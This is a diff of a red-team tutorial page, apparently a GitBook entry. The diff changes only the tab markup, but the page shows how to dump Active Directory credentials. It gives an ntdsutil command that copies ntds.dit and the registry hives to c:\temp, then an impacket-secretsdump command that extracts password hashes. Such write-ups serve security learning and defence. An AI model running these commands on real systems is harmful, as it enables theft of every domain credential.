@@ -10,13 +10,13 @@ description: >-
 
 Dumping the required files using a native windows binary ntdsutil.exe to c:\temp:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```bash
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\temp:
 
@@ -24,13 +24,13 @@ We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are b
 
 We can then dump password hashes:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```bash
 root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/ntds-hashdump%20%281%29.png)
 
